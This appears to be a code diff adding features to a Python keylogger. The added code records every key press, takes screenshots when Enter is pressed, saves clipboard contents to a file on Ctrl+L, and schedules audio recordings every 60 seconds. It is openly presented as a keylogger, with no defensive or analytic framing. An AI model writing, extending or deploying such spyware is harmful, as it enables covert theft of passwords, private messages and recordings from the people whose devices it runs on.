@@ -1,4 +1,5 @@
 
+
 try:
     import os
     import pyperclip
@@ -77,3 +78,31 @@ def log_data(key):
         except Exception as e:
             print(f"Error logging key: {e}")
 
+def keyPressed(key):
+    """Callback function for key presses."""
+    print(str(key))
+    log_data(key)
+
+    # Take a screenshot after pressing Enter
+    if key == keyboard.Key.enter:
+        take_screenshot()
+
+    # Capture clipboard contents when pressing Ctrl+L
+    if key == keyboard.Key.ctrl_l:  # Change this to any other key combination if preferred
+        clipboard_content = capture_clipboard()
+        if clipboard_content:
+            with open("clipboard.txt", 'a') as clipkey:
+                clipkey.write(f"{clipboard_content}\n")
+                print(f"Clipboard content captured: {clipboard_content}")
+
+if __name__ == '__main__':
+    # Start the keylogger
+    listener = keyboard.Listener(on_press=keyPressed)
+    listener.start()
+
+    # Schedule regular audio recordings (every 60 seconds)
+    schedule_audio_recording(interval=60)  # Change the interval as needed
+
+    # Keep the program running
+    input("Press Enter to stop logging.\n")
+    listener.stop()
